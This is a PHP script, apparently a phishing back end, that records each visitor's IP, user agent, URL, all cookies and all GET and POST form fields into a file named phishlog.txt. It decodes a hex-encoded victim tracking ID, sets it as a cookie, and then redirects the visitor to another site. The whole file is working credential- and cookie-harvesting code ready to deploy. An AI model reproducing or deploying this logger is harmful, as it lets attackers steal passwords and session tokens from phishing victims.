<?php
# Отельное спасибо dinimus :D
############### SETTINGS ###############
$LOGFILE = 'topsecret/phishlog.txt';
$URLRedirect = 'https://somesite.ru';
$CodedParamName = 'userid';
$ResultMarker = 'blablabla';
########################################
function exceptions_error_handler($severity, $message, $filename, $lineno) {
    throw new ErrorException($message, 0, $severity, $filename, $lineno);
}
set_error_handler('exceptions_error_handler');

$DehexDict = array();
$ErrorDict = array();
$LOG = '';

$actual_link = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$ip = getenv('REMOTE_ADDR');
$userAgent = getenv('HTTP_USER_AGENT');
$requri = $_SERVER['REQUEST_URI'];
$today = date("Y-m-d H:i:s");  

$LOG .= "URL: ".$actual_link."\n\r";
$LOG .= "Date: $today \n\r";
$LOG .= "IP: $ip \n\r";
$LOG .= "UserAgent: $userAgent \n\r";


if (basename(dirname($requri)) == $CodedParamName) {
    try {
        $dehex = hex2bin(basename($requri));
        if (!empty($dehex)) {
            $DehexDict[basename($requri)] = $dehex;
            $LOG .= "Decoded from PATH: ".htmlspecialchars($dehex)."\n\r";
        }
    } catch(Throwable $ex) {
        $ErrorDict[] = basename($requri);
    }
}

foreach ($_COOKIE as $key => $value) {
if ($key == $CodedParamName) {
    try {
        $dehex = hex2bin($value);
        if (!empty($dehex)) {
            $DehexDict[$value] = $dehex;
            $LOG .= "Decoded from COOKIE: ".htmlspecialchars($dehex)."\n\r";
        }
    } catch(Throwable $ex) {
        $ErrorDict[] = $value;
    }
} else {
    $LOG .= "Cookie \"".htmlspecialchars($key)."\" is \"".htmlspecialchars($value)."\"\n\r";
}
}

foreach ($_POST as $key => $value) {
if ($key == $CodedParamName) {
    try {
        $dehex = hex2bin($value);
        if (!empty($dehex)) {
            $DehexDict[$value] = $dehex;
            setcookie($CodedParamName, $value, time()+360000, "/"); 
            $LOG .= "Decoded from POST: ".htmlspecialchars($dehex)."\n\r";
        }
    } catch(Throwable $ex) {
        $ErrorDict[] = $value;
    }
} else {
    $LOG .= "POST Field \"".htmlspecialchars($key)."\" is \"".htmlspecialchars($value)."\"\n\r";    
}
}

foreach ($_GET as $key => $value) {
if ($key == $CodedParamName) {
    try {
        $dehex = hex2bin($value);
        if (!empty($dehex)) {
            $DehexDict[$value] = $dehex;
            setcookie($CodedParamName, $value, time()+360000, "/"); 
            $LOG .= "Decoded from GET: ".htmlspecialchars($dehex)."\n\r";
        }
    } catch(Throwable $ex) {
        $ErrorDict[] = $value;
    }
} else {
    $LOG .= "GET Field \"".htmlspecialchars($key)."\" is \"".htmlspecialchars($value)."\"\n\r";
}
}

foreach($DehexDict as $value) {
    $LOG .= "RESULT: ".htmlspecialchars($value).":".$ResultMarker."\n\r";
}
foreach($ErrorDict as $value) {
    $LOG .= "DECODE ERRORS: ".htmlspecialchars($value).":".$ResultMarker."\n\r";
}

$LOG .= "--------------------------------------\n\r";
@file_put_contents($LOGFILE, $LOG, FILE_APPEND);

header("Location: $URLRedirect");
#exit;
?>
